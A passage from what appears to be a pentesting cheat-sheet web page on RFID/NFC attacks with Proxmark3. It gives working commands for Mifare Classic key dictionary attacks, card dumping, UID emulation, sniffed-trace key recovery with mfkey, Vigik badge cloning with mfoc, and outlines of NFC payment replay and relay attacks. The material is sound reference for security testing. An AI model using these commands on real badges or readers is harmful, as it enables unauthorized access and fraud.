<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="p">-</span><span class="n">-atqa</span><span class="p">:</span><span class="n">00</span> <span class="n">04</span>  <span class="n">sak</span><span class="p">:</span><span class="n">08</span>          
<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="n">Chinese</span> <span class="n">magic</span> <span class="n">backdoor</span> <span class="n">commands</span> <span class="p">(</span><span class="n">GEN</span> <span class="n">1a</span><span class="p">)</span> <span class="n">detected</span>  
</code></pre></div>
<p>To set all the block <code>hf mf csetblk 0 42917CAB00080400022A2C87933EF21D</code></p>
<p>NOTE: The UID from several cards can be computed with the displayed id, e.g: ID is 2910621770.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="kn">import</span> <span class="nn">struct</span>
<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span><span class="mi">2910621770</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>
<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="s1">&#39;4a907cad&#39;</span>
</code></pre></div>
<h3 id="unbricking-chinese-magic-mifare-classic">Unbricking Chinese Magic Mifare Classic</h3>
<p>If you set the wrong BCC for UID and can't read the card anymore, you can use some backdoor commands to change sector 0 using Proxmark:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="n">hf</span> <span class="n">14a</span> <span class="n">raw</span> <span class="n">-a</span> <span class="n">-p</span> <span class="n">-b</span> <span class="n">7</span> <span class="n">40</span>
<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="n">hf</span> <span class="n">14a</span> <span class="n">raw</span> <span class="n">-p</span> <span class="n">43</span>
<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="n">hf</span> <span class="n">14a</span> <span class="n">raw</span> <span class="n">-p</span> <span class="n">-c</span> <span class="n">a0</span> <span class="n">00</span>
<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="n">hf</span> <span class="n">14a</span> <span class="n">raw</span> <span class="n">-p</span> <span class="n">-c</span> <span class="n">de</span> <span class="n">ad</span> <span class="n">be</span> <span class="n">ef</span> <span class="n">22</span> <span class="n">08</span> <span class="n">04</span> <span class="n">00</span> <span class="n">46</span> <span class="n">59</span> <span class="n">25</span> <span class="n">58</span> <span class="n">49</span> <span class="n">10</span> <span class="n">23</span> <span class="n">02</span>
</code></pre></div>
<h3 id="key-bruteforcedictionary-attack">Key Bruteforce/Dictionary attack</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="n">hf</span> <span class="n">mf</span> <span class="n">chk</span> <span class="p">*</span><span class="n">1</span> <span class="p">?</span> <span class="n">t</span>                <span class="c"># Default keys</span>
<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="n">hf</span> <span class="n">mf</span> <span class="n">chk</span> <span class="p">*</span><span class="n">1</span> <span class="p">?</span> <span class="n">d</span> <span class="n">default_keys</span><span class="p">.</span><span class="n">dic</span>
<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="n">hf</span> <span class="n">mf</span> <span class="n">chk</span> <span class="n">0</span> <span class="n">A</span> <span class="n">default_keys</span><span class="p">.</span><span class="n">dic</span>  <span class="c"># Dictionary attack with file: default_keys.dic</span>
</code></pre></div>
<h3 id="write-and-read-sectors">Write and read sectors</h3>
<blockquote>
<p>Avoid writing wrbl 3 (contains key A/B + permissions)</p>
</blockquote>
<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="n">proxmark3</span><span class="p">&gt;</span> <span class="n">hf</span> <span class="n">mf</span> <span class="n">wrbl</span> <span class="n">1</span> <span class="n">a</span> <span class="n">ffffffffffff</span> <span class="n">000102030405060708090a0b0c0d0e0f</span>   
<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="n">proxmark3</span><span class="p">&gt;</span> <span class="n">hf</span> <span class="n">mf</span> <span class="n">wrbl</span> <span class="n">2</span> <span class="n">a</span> <span class="n">ffffffffffff</span> <span class="n">464c4147313a4d31664072335f303037</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="n">hf</span> <span class="n">mf</span> <span class="n">rdsc</span> <span class="p">&lt;</span><span class="n">sector</span> <span class="n">number</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">key</span> <span class="n">A</span><span class="p">/</span><span class="n">B</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">key</span> <span class="p">(</span><span class="n">12</span> <span class="n">hex</span> <span class="n">symbols</span><span class="p">)&gt;</span>
</code></pre></div>
<h3 id="dump-mifare-card">Dump Mifare card</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="n">proxmark3</span><span class="p">&gt;</span> <span class="n">hf</span> <span class="n">mf</span> <span class="n">dump</span> <span class="n">1</span> <span class="n">k</span> <span class="n">hf-mf-A29558E4-key</span><span class="p">.</span><span class="n">bin</span> <span class="n">f</span> <span class="n">hf-mf-A29558E4-data</span><span class="p">.</span><span class="n">bin</span>
<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>
<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="p">&lt;</span><span class="n">card</span> <span class="n">memory</span><span class="p">&gt;:</span> <span class="n">0</span> <span class="p">=</span> <span class="n">320</span> <span class="n">bytes</span> <span class="p">(</span><span class="n">Mifare</span> <span class="n">Mini</span><span class="p">),</span> <span class="n">1</span> <span class="p">=</span> <span class="n">1K</span> <span class="p">(</span><span class="k">default</span><span class="p">),</span> <span class="n">2</span> <span class="p">=</span> <span class="n">2K</span><span class="p">,</span> <span class="n">4</span> <span class="p">=</span> <span class="n">4K</span>
<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="n">k</span> <span class="p">&lt;</span><span class="n">name</span><span class="p">&gt;</span>     <span class="p">:</span> <span class="n">key</span> <span class="n">filename</span><span class="p">,</span> <span class="k">if</span> <span class="n">no</span> <span class="p">&lt;</span><span class="n">name</span><span class="p">&gt;</span> <span class="n">given</span><span class="p">,</span> <span class="n">UID</span> <span class="n">will</span> <span class="n">be</span> <span class="n">used</span> <span class="n">as</span> <span class="n">filename</span>
<a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="n">f</span> <span class="p">&lt;</span><span class="n">name</span><span class="p">&gt;</span>     <span class="p">:</span> <span class="n">data</span> <span class="n">filename</span><span class="p">,</span> <span class="k">if</span> <span class="n">no</span> <span class="p">&lt;</span><span class="n">name</span><span class="p">&gt;</span> <span class="n">given</span><span class="p">,</span> <span class="n">UID</span> <span class="n">will</span> <span class="n">be</span> <span class="n">used</span> <span class="n">as</span> <span class="n">filename</span>
</code></pre></div>
<h3 id="simulate-and-emulate-mifare-card">Simulate and emulate Mifare card</h3>
<p>Emulate from a dump file</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="c"># convert .bin to .eml</span>
<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="n">proxmark3</span><span class="p">&gt;</span> <span class="n">script</span> <span class="n">run</span> <span class="n">dumptoemul</span> <span class="n">-i</span> <span class="n">dumpdata</span><span class="p">.</span><span class="n">bin</span>
<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="n">proxmark3</span><span class="p">&gt;</span> <span class="n">hf</span> <span class="n">mf</span> <span class="n">eload</span> <span class="p">&lt;</span><span class="n">file</span> <span class="n">name</span> <span class="n">w</span><span class="p">/</span><span class="n">o</span> <span class="p">.</span><span class="n">eml</span><span class="p">&gt;</span>
</code></pre></div>
<p>Simulate Mifare 1K UID</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="n">proxmark3</span><span class="p">&gt;</span> <span class="n">hf</span> <span class="n">mf</span> <span class="n">sim</span> <span class="n">u</span> <span class="n">353c2aa6</span>
</code></pre></div>
<h3 id="mitm-attack">MITM attack</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="n">hf</span> <span class="n">14a</span> <span class="n">snoop</span>
<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="c"># read card</span>
<a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a><span class="c"># push button</span>
<a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>
<a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a><span class="n">hf</span> <span class="n">list</span> <span class="n">14a</span>
<a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a><span class="n">089220</span> <span class="p">|</span>   <span class="n">095108</span> <span class="p">|</span> <span class="n">Tag</span> <span class="p">|</span> <span class="n">4d</span>  <span class="n">xx</span>  <span class="n">xx</span>  <span class="n">xx</span>  <span class="n">d3</span>                                              <span class="p">|</span>     <span class="p">|</span> <span class="n">UID</span>
<a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a><span class="n">114608</span> <span class="p">|</span>   <span class="n">125072</span> <span class="p">|</span> <span class="nb">Rdr </span><span class="p">|</span> <span class="n">93</span>  <span class="n">70</span>  <span class="n">4d</span>  <span class="n">xx</span>  <span class="n">xx</span>  <span class="n">xx</span>  <span class="n">d3</span>  <span class="n">4f</span>  <span class="n">8d</span>                              <span class="p">|</span>  <span class="n">ok</span> <span class="p">|</span> <span class="n">SELECT_UID</span>
<a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a><span class="p">...</span>
<a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a><span class="n">525076</span> <span class="p">|</span>   <span class="n">529748</span> <span class="p">|</span> <span class="n">Tag</span> <span class="p">|</span> <span class="n">61</span>  <span class="n">7a</span>  <span class="n">66</span>  <span class="n">18</span>                                                  <span class="p">|</span>     <span class="p">|</span> <span class="n">TAG</span> <span class="n">CHALLENGE</span>
<a id="__codelineno-29-10" name="__codelineno-29-10" href="#__codelineno-29-10"></a><span class="n">540608</span> <span class="p">|</span>   <span class="n">549920</span> <span class="p">|</span> <span class="nb">Rdr </span><span class="p">|</span><span class="n">50</span><span class="p">!</span> <span class="n">87</span><span class="p">!</span>  <span class="n">8e</span>  <span class="n">ab</span> <span class="n">3b</span><span class="p">!</span>  <span class="n">49</span>  <span class="n">5a</span>  <span class="n">1b</span>                                  <span class="p">|</span> <span class="p">!</span><span class="n">crc</span><span class="p">|</span> <span class="n">HALT</span>
<a id="__codelineno-29-11" name="__codelineno-29-11" href="#__codelineno-29-11"></a><span class="n">551188</span> <span class="p">|</span>   <span class="n">555860</span> <span class="p">|</span> <span class="n">Tag</span> <span class="p">|</span><span class="n">d6</span><span class="p">!</span> <span class="n">53</span><span class="p">!</span>  <span class="n">7c</span> <span class="n">57</span><span class="p">!</span>                                                  <span class="p">|</span>     <span class="p">|</span> <span class="n">TAG</span> <span class="n">RESPONSE</span>
<a id="__codelineno-29-12" name="__codelineno-29-12" href="#__codelineno-29-12"></a><span class="n">UID</span><span class="p">:</span> <span class="n">4dxxxxxxd3</span>
<a id="__codelineno-29-13" name="__codelineno-29-13" href="#__codelineno-29-13"></a><span class="n">TAG</span> <span class="n">CHALLENGE</span><span class="p">:</span> <span class="n">617a6618</span>
<a id="__codelineno-29-14" name="__codelineno-29-14" href="#__codelineno-29-14"></a><span class="n">READER</span> <span class="n">CHALLENGE</span><span class="p">:</span> <span class="n">50878eab</span>
<a id="__codelineno-29-15" name="__codelineno-29-15" href="#__codelineno-29-15"></a><span class="n">READER</span> <span class="n">RESPONSE</span><span class="p">:</span> <span class="n">3b495a1b</span>
<a id="__codelineno-29-16" name="__codelineno-29-16" href="#__codelineno-29-16"></a><span class="n">TAG</span> <span class="n">RESPONSE</span><span class="p">:</span> <span class="n">d6537c57</span>
<a id="__codelineno-29-17" name="__codelineno-29-17" href="#__codelineno-29-17"></a>
<a id="__codelineno-29-18" name="__codelineno-29-18" href="#__codelineno-29-18"></a><span class="c"># crapto1gui or mfkey</span>
<a id="__codelineno-29-19" name="__codelineno-29-19" href="#__codelineno-29-19"></a><span class="nb">cd </span><span class="n">tools</span><span class="p">/</span><span class="n">mfkey</span>
<a id="__codelineno-29-20" name="__codelineno-29-20" href="#__codelineno-29-20"></a><span class="n">make</span>
<a id="__codelineno-29-21" name="__codelineno-29-21" href="#__codelineno-29-21"></a><span class="p">./</span><span class="n">mfkey64</span>
<a id="__codelineno-29-22" name="__codelineno-29-22" href="#__codelineno-29-22"></a><span class="p">./</span><span class="n">mfkey64</span> <span class="n">xxxxxxxx</span> <span class="n">3b45a45a</span> <span class="n">7ddb6646</span> <span class="n">142fc1b9</span> <span class="n">9195fb3f</span>
</code></pre></div>
<h3 id="reader-only-attack">Reader only attack</h3>
<p>Emulate a MIFARE Classic with a DEADBEEF UID.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="n">proxmark3</span><span class="p">&gt;</span> <span class="n">hf</span> <span class="n">mf</span> <span class="n">sim</span> <span class="n">u</span> <span class="n">deadbeef</span> <span class="n">n</span> <span class="n">1</span> <span class="n">x</span>
<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="n">mf</span> <span class="n">1k</span> <span class="n">sim</span> <span class="n">uid</span><span class="p">:</span> <span class="n">de</span> <span class="n">ad</span> <span class="n">be</span> <span class="n">ef</span> <span class="p">,</span> <span class="n">numreads</span><span class="p">:</span><span class="n">0</span><span class="p">,</span> <span class="n">flags</span><span class="p">:</span><span class="n">18</span> <span class="p">(</span><span class="n">0x12</span><span class="p">)</span>
<a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="c">#db# Collected two pairs of AR/NR which can be used to extract keyA from reader for sector 1:</span>
<a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a><span class="c">#db# ../tools/mfkey/mfkey32 deadbeef 0102xxxx 4d9axxxx 87e7xxxx 06d2xxxx b4a0xxxx</span>
<a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a><span class="c">#db# Emulator stopped. Tracing: 1 trace length: 253</span>
<a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a><span class="c">#db# 4B UID: deadbeef</span>
</code></pre></div>
<h3 id="read-a-mifare-dump">Read a Mifare Dump</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="n">pip</span> <span class="n">install</span> <span class="n">bitstring</span>
<a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">zhovner</span><span class="p">/</span><span class="n">mfdread</span>
<a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="n">mfdread</span><span class="p">.</span><span class="n">py</span> <span class="p">./</span><span class="n">dump</span><span class="p">.</span><span class="n">mfd</span>
</code></pre></div>
<h2 id="hf-mifare-classic-4k">HF - Mifare Classic 4k</h2>
<h3 id="chinese-magic-mifare-classic-4k">Chinese Magic Mifare Classic 4K</h3>
<p>Block 0 is writable through normal Mifare Classic commands, i.e. there is not special “unlocked” read/write like in “magic Mifare 1k” version.</p>
<p>Writing block 0 with Proxmark, UID 01020304, using key A being FFFFFFFFFFFF:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="n">hf</span> <span class="n">mf</span> <span class="n">wrbl</span> <span class="n">0</span> <span class="n">a</span> <span class="n">FFFFFFFFFFFF</span> <span class="n">01020304040000000000000000000000</span>
</code></pre></div>
<p>Again, watch out to have correct BCC and avoid Cascading Tag (0x88) as first byte of UID, or you may make the card unselectable (i.e. brick it).</p>
<h2 id="hf-vigik">HF - Vigik</h2>
<p>Tool : https://github.com/cjbrigato/kigiv-for-proxmark3/releases</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="n">modprobe</span> <span class="n">-r</span> <span class="n">pn533_usb</span>
<a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="n">modprobe</span> <span class="n">-r</span> <span class="n">pn533</span>
<a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="n">nfc-list</span> <span class="c"># Vérifier le bon fonctionnement du lecteur</span>
<a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="n">mfoc</span> <span class="n">-P</span> <span class="n">500</span> <span class="n">-O</span> <span class="n">carte-vierge</span><span class="p">.</span><span class="n">dmp</span> <span class="c"># Extraire les clés de chiffrement de la puce RFID chinoise dans un fichier</span>
<a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="n">mfoc</span> <span class="n">-P</span> <span class="n">500</span> <span class="n">-O</span> <span class="n">carte-originale</span><span class="p">.</span><span class="n">dmp</span> <span class="c"># Copiez le contenu de la puce RFID d’origine dans un fichier</span>
<a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a><span class="n">nfc-mfclassic</span> <span class="n">W</span> <span class="n">a</span> <span class="n">carte-originale</span><span class="p">.</span><span class="n">dmp</span> <span class="n">carte-vierge</span><span class="p">.</span><span class="n">dmp</span> <span class="c"># Ecrire le contenu de la puce originale sur la puce chinoise</span>
</code></pre></div>
<h2 id="replay-attacks">Replay Attacks</h2>
<p>Replay attack is a technique where a malicious user could implement a device to intercept a NFC transaction and redeem it later, using other device or even in different location. </p>
<h2 id="relay-attack">Relay Attack</h2>
<p>The relay attack is a technique where a malicious user implements a man in the middle attack. The attacker(APDUer) is capable to intercept, manipulate and change the transaction in real time to take advantage of it.<br />
<a href="https://en.wikipedia.org/wiki/Relay_attack">https://en.wikipedia.org/wiki/Relay_attack</a></p>
<ul>
<li>NFC Payment Relay Attacks - <a href="https://salmg.net/2018/12/01/intro-to-nfc-payment-relay-attacks/">intro-to-nfc-payment-relay-attacks/</a></li>
<li>NFCopy85 is a 10 dollars device to make replay attacks against NFC payment systems - <a href="https://salmg.net/2019/06/16/nfcopy85/">nfcopy85</a></li>
</ul>
<h2 id="references">References</h2>
<ul>
<li>https://blog.kchung.co/rfid-hacking-with-the-proxmark-3/</li>
<li>https://aur.archlinux.org/packages/proxmark3/</li>
<li>https://github.com/Proxmark/proxmark3/wiki/Kali-Linux</li>
<li>https://github.com/Proxmark/proxmark3/wiki/Mifare-HowTo</li>
<li>https://www.latelierdugeek.fr/2017/07/12/rfid-le-clone-parfait/</li>
<li>https://github.com/cjbrigato/kigiv-for-proxmark3/releases</li>
<li>http://guillaumeplayground.net/proxmark3-hardnested/</li>
<li>https://www.ordinoscope.net/index.php/Electronique/Hardware/Divers/RFID/Proxmak3/Mf_(Mifare)</li>
<li>https://pi3rrot.net/wiki/doku.php?id=rfid:break_mifare1k_proxmark3</li>
<li>https://connect.ed-diamond.com/MISC/MISCHS-016/Proxmark-3-le-couteau-suisse-RFID</li>
<li>https://blandais.github.io/mifare/fr</li>
<li>http://www.icedev.se/pm3docs.aspx</li>
<li>http://www.icedev.se/pm3cmds.aspx</li>
<li>https://scund00r.com/all/rfid/2018/06/05/proxmark-cheatsheet.html</li>
<li>https://www.tinker.sh/badge-cloning-clone-hid-prox-with-proxmark3-rvd4/</li>
<li>https://hackmethod.com/hacking-mifare-rfid/</li>
<li>https://hackmethod.com/hacking-mifare-rfid-2/</li>
<li>https://github.com/Proxmark/proxmark3/wiki/Mifare-Tag-Ops</li>
<li>http://arishitz.net/coffee-nfc-exploit-coffee-again/</li>
<li>https://thetraaaxx.org/writeup-irl-hacking-le-porte-monnaie-nfc-securise</li>
<li>https://linuskarlsson.se/blog/acr122u-mfcuk-and-mfoc-cracking-mifare-classic-on-arch-linux/</li>
<li>https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/cheatsheet.md</li>
<li>https://smartlockpicking.com/slides/Confidence_A_2018_Practical_Guide_To_Hacking_RFID_NFC.pdf</li>
</ul>







  
    
  
  


  <aside class="md-source-file">
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="Last update">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1-2.1-2M12.5 7v5.2l4 2.4-1 1L11 13V7h1.5M11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2v1.8Z"/></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">April 24, 2024</span>
  </span>

    
    
    
    
  </aside>





                
  <div class="social-container">
    <b>Share this content</b>
    <div class="a2a_kit a2a_kit_size_32 a2a_default_style">
      <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
      <a class="a2a_button_x"></a>
      <a class="a2a_button_telegram"></a>
      <a class="a2a_button_linkedin"></a>
      <a class="a2a_button_email"></a>
      <a class="a2a_button_microsoft_teams"></a>
    </div>
    <br>
    <script async src="https://static.addtoany.com/menu/page.js"></script>
  </div>

              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../..", "features": ["content.code.copy", "content.action.edit", "content.action.view", "content.tooltips", "navigation.tracking", "navigation.top", "search.share", "search.suggest"], "search": "../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.3220b9d7.min.js"></script>
      
    
  </body>
</html>